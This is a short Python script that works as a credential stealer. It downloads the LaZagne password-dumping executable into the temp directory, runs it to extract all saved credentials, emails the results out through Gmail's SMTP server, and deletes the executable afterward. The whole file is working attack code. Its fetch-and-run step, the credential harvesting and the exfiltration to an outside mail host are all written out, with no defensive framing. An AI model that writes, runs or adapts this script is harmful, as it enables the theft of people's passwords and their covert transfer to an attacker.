import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
	get_request = requests.get(url)
	with open("lazagne.exe", "wb") as file:
		file.write(get_request.content)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output("lazagne.exe all -v", shell=True).decode('utf-8')
print(result)
send_mail("mail@gmail.com", "password", result)
os.remove("lazagne.exe")